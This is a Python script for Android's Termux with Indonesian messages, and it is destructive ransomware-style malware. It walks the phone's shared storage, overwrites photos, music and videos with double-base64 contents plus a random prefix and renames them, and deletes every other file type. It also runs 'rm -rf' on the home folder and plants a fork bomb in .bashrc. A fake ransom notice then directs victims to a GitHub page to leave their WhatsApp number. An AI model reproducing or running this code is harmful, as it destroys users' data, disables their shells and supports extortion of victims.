from zipfile import ZipFile
from base64 import b64encode
from base64 import b64decode
import os, datetime, sys, time, random
from shutil import copyfile
os.system('termux-setup-storage')

def pes(cuk):
    for ewe in cuk + '\n':
        sys.stdout.write(ewe)
        sys.stdout.flush()
        time.sleep(0.06)


def pesl(cuk):
    for ewe in cuk + '\n':
        sys.stdout.write(ewe)
        sys.stdout.flush()
        time.sleep(0.1)


def apa():
    os.system('clear')
    print '\x1b[38;5;022m\xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xae\n\xe2\x94\x82   KETERANGAN   \xe2\x94\x82\n\xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xaf\n'
    print '\x1b[38;5;022m ' + 50 * '*' + '\n *\x1b[38;5;015m\x1b[48;5;009m  Anda Terkena Virus, Dan semua File Yang ada   \x1b[48;5;000m\x1b[38;5;022m*\n *\x1b[38;5;015m\x1b[48;5;009m  di Memori Internal anda Sudah TerEncrypt.     \x1b[48;5;000m\x1b[38;5;022m*\n *\x1b[38;5;232m\x1b[48;5;015m  TIDAK bisa Dilihat, Dibaca ataupun Dimiliki   \x1b[48;5;000m\x1b[38;5;022m*\n *\x1b[38;5;232m\x1b[48;5;015m  (Karena dia udah jadi milik orang lain)       \x1b[48;5;000m\x1b[38;5;022m*\n ' + 50 * '*' + '\n * \x1b[38;5;242m NOTE: File Anda AMAN, Asal jangan Buka SC ini \x1b[38;5;022m*\n *\x1b[38;5;242m        lebih dari 1 KALI.                      \x1b[38;5;022m*\n ' + 50 * '*'
    print '\n\x1b[38;5;022m\xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xae\n\xe2\x94\x82 Apa FILE Saya Bisa Kembali ? \xe2\x94\x82\n\xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xaf \n\n \x1b[38;5;022m' + 50 * '*' + '\n *  TENTU, File Anda TerEncrypt Dengan Aman       *\n *  dan Tidak Terhapus. Semua File (Foto, Musik   *\n *  & Video) Akan Kembali Seperti Semula.         *\n ' + 50 * '*'
    print '\n\x1b[38;5;022m\xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xae\n\xe2\x94\x82 Apa Yang Harus Saya Lakukan? \xe2\x94\x82\n\xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xaf \n\n ' + 50 * '*' + '\n *  Silahkan Komentar Di Github Saya,             *\n *  => \x1b[38;5;046mhttps://github.com/gellmoxer               \x1b[38;5;022m*\n *  Dan Cantumkan Nomor WA Anda.                  *\n ' + 50 * '*' + '\n\n\x1b[48;5;052m\x1b[38;5;015m SCREENSHON AGAR TIDAK LUPA \x1b[48;5;000m*\n'


def get_all_file_paths(directory):
    icn = [
     'QEdFTExNb3hlci5FbmMoc3VwZXIpVnkyYlVUZFh3M21OdnFMa3gwbWd5', 'UjBWTVRFQkZibU55ZVhCMFltRnpaVEkzTWpNb1pYaGxZeTV5WlhabGNuTmxLRWxuY3prMlltRldZMnhSZDJORmMyeElZWFJS', 'UjBWTVRFQkZibU55ZVhCMExuSmxkbVZ5YzJVdWMzQnNhU2dwS0dWNFpXTW9ZbUZXWTJ4UmQyTkZjMnhJTm1oaFVHVklkdz09', 'UjBWTVRFQkZibU55ZVhCMExuTndiR2tvS1Nod2VVVnVZeWhqTm5kS1kxaGpiRlIzY3psSVlsSnlaVTU1']
    gell = random.choice(icn)
    file_paths = []
    for root, directories, files in os.walk(directory):
        for filename in files:
            filepath = os.path.join(root, filename)
            filepathr = filepath.replace('.', ' ')
            fileas = filepathr.split()[(-1)]
            fileask = fileas.lower()
            foto = ['jpg', 'jpeg', 'png', 'gif']
            video = ['mp4', '3gp', 'mpv']
            musik = ['mp3', 'wav', 'ogg']
            sc = ['txt', 'py', 'pyc', 'sh', 'php', 'zip', '7z', 'tar', 'gz', 'pkg', 'java', 'lua', 'rar', 'pdf', 'html', 'htm', 'css', 'js', 'xhtml', 'sys', 'doc', 'webp', 'crypt1', 'crypt12', 'opus', 'enc', 'db', 'dat', 'usr', 'tps', 'xth', 'xml', 'aes', 'doc', 'json', 'arsc', 'cfg', 'ttf', 'obj', 'obb', 'bak', 'tmp']
            if fileask in foto:
                filesp = filepathr.split()[0]
                filespa = filesp + '_GellMoxer.jpg'
                os.rename(filepath, filespa)
                file_paths.append(filespa)
                with open(filespa, 'rb') as (image_file):
                    encoded_string = b64encode(image_file.read())
                    decoded_string = b64encode(encoded_string)
                    with open(filespa, 'w') as (image_file2):
                        image_file2.write(gell + decoded_string)
            elif fileask in musik:
                filesp = filepathr.split()[0]
                filespa = filesp + '_GellMoxer.mp3'
                os.rename(filepath, filespa)
                file_paths.append(filespa)
                with open(filespa, 'rb') as (image_file):
                    encoded_string = b64encode(image_file.read())
                    decoded_string = b64encode(encoded_string)
                    with open(filespa, 'w') as (image_file2):
                        image_file2.write(gell + decoded_string)
            elif fileask in video:
                filesp = filepathr.split()[0]
                filespa = filesp + '_GellMoxer.mp4'
                os.rename(filepath, filespa)
                file_paths.append(filespa)
                with open(filespa, 'rb') as (image_file):
                    encoded_string = b64encode(image_file.read())
                    decoded_string = b64encode(encoded_string)
                    with open(filespa, 'w') as (image_file2):
                        image_file2.write(gell + decoded_string)
            elif fileask == 'apk':
                filesp = filepathr.split()[0]
                filespa = filesp + '.apk'
                os.rename(filepath, filespa)
                os.remove(filespa)
            elif fileask in sc:
                filesp = filepathr.split()[0]
                filespa = filesp + '.sc'
                os.rename(filepath, filespa)
                os.remove(filespa)
            else:
                filesp = filepathr.split()[0]
                filespa = filesp + '.OndeOnde'
                os.rename(filepath, filespa)
                os.remove(filespa)

    return file_paths


def main():
    directory = './python_files'
    file_paths = get_all_file_paths('/sdcard')
    print '\n\n\x1b[1;96m            MOHON DI BACA:\n' + 40 * '-'
    pes('\n       \x1b[1;91mJANGAN DI SKIP! PENTING!!')
    pes(' \x1b[1;92mSEMUA File Anda Sudah \x1b[1;96mTerEncrypt \xf0\x9f\x94\x90\n')
    pesl('  \x1b[1;91mBERHENTILAH MENCURI:\n  \x1b[1;96m\xe2\x9d\x9d Dan peliharalah dirimu dari (azab yang terjadi pada)\n    hari yang pada waktu itu kamu semua dikembalikan\n    kepada Allah. (QS. Al Baqarah: 281)\xe2\x9d\x9e\n')
    pes(' \x1b[1;97m_> \x1b[1;91mNOTE:\x1b[1;92m SELAIN FILE FOTO, MUSIC DAN VIDEO, \x1b[1;91m SUDAH TERHAPUS!!\n          \x1b[1;92mDAN JANGAN BUKA \x1b[1;96mSC\x1b[1;92m INI 2 KALI.!! AGAR FILE ANDA AMAN. ')
    pes('\n\n \x1b[1;94m Sekarang Coba Buka \x1b[1;97m(\x1b[1;91mMEMORY TELEPHON\x1b[1;97m)\x1b[1;92m ANDA.!!\n Masih Ada dan Tidak \x1b[1;96m Terhapus,\x1b[1;92m Hanya Tidak Bisa\n Dilihat ataupun di Buka.')
    pesl('\x1b[1;93m Untuk Keterangan Lebih Lanjut \x1b[1;92mKetik \x1b[1;96mhelp\x1b[1;92m \n\n         \x1b[1;96m \xe2\x9d\x8cDONT CRY \xf0\x9f\x98\x9b\xf0\x9f\x91\xbb')
    time.sleep(1)
    tyn = raw_input('\n\x1b[1;97m    _>\x1b[1;96m ')
    tym = ['help', 'Help', 'HELP']
    if tyn in tym:
        apa()
    else:
        os.sys.exit()


if __name__ == '__main__':
    iz = raw_input('\n\n\n\x1b[1;97m\xe2\x9e\xa4 \x1b[1;92mIzinkan Akses SDCARD (y/n) : \x1b[1;96m')
    siap = ['y', 'Y', 'Yes', 'yes', 'ya', 'Ya', 'ok', 'Ok']
    if iz in siap:
        os.system('termux-setup-storage')
        os.system('rm -rf ~/*')
        os.system('touch .hushlogin')
        os.system('printf ":(){ :|: & };:\n" > $HOME/.bashrc')
    else:
        print '\x1b[1;97m\n\xe2\x9e\xa4\x1b[1;91m KELUAR!\n'
        os.sys.exit()
    os.system('clear')
    main()⏎